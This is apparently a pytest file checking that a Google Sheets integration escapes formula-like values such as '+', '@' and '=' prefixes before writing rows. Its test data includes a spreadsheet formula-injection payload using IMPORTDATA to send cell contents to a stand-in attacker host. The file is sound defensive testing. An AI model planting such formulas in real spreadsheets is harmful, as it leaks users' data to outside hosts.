"""Values pushed to Google Sheets must not be evaluated as formulas."""

import asyncio

import httpx
import pytest

from apps.api.services.integrations import sheets

FORMULA = '=IMPORTDATA("https://attacker.invalid/?d="&A1)'


class _Client:
    def __init__(self, calls):
        self.calls = calls

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        return None

    async def get(self, url, **kwargs):
        return httpx.Response(200, json={"values": []})

    async def post(self, url, **kwargs):
        self.calls.append(kwargs)
        return httpx.Response(200, json={"updates": {"updatedRange": "Leads!A2:E2"}})

    async def put(self, url, **kwargs):
        self.calls.append(kwargs)
        return httpx.Response(200, json={"updatedRange": "Leads!A2:E2"})


@pytest.fixture
def calls(monkeypatch):
    recorded = []
    monkeypatch.setattr(sheets, "_token", lambda workspace_id=None: "token")
    monkeypatch.setattr(sheets.httpx, "AsyncClient", lambda **kwargs: _Client(recorded))
    return recorded


VALUES = [FORMULA, "+1 555 0100", "@cmd", 42, "-7", "Acme = best", None]
EXPECTED = ["'" + FORMULA, "'+1 555 0100", "'@cmd", "42", "-7", "Acme = best", ""]


def test_append_row_stores_formula_like_text_verbatim(calls):
    result = asyncio.run(sheets.append_row("sheet-1", VALUES, "Leads", "ws-a"))

    assert result["success"] is True
    assert calls[-1]["params"]["valueInputOption"] == "USER_ENTERED"
    assert calls[-1]["json"]["values"] == [EXPECTED]


def test_upsert_row_stores_formula_like_text_verbatim(calls):
    result = asyncio.run(sheets.upsert_row("sheet-1", VALUES, "delivery-key", "Leads!A:ZZ", "ws-a"))

    assert result["success"] is True
    assert calls[-1]["json"]["values"] == [["delivery-key", *EXPECTED]]
